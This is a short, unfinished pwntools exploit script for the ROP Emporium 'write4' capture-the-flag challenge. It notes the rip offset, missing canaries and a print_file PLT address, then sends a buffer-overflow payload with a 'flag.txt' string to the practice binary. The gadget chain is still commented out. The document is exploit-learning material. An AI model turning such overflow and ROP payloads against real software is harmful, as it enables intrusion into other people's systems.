# https://ropemporium.com/challenge/write4.html
from pwn import *

# according to ghidra, there is a print_file() function in libwrite4.so that we should call
# from gdb, the rip offset is 40
# no canaries
# print_file@plt => 0x400510

context.terminal = ["gnome-terminal", "--"]
shell = gdb.debug("./write4", "continue")
# shell = process("./write4")

# 0x00007fd7f4586967 : mov rdi, qword ptr [rsp - 8] ; ret

payload  = b"A" * 40
payload += b"B" * 8
# payload += b"C" * 8
payload += b"flag.txt\0".ljust(16, b"\0")
# payload += p64(0x400510) # print_file@plt
shell.sendlineafter(b"> ", payload)

shell.interactive()
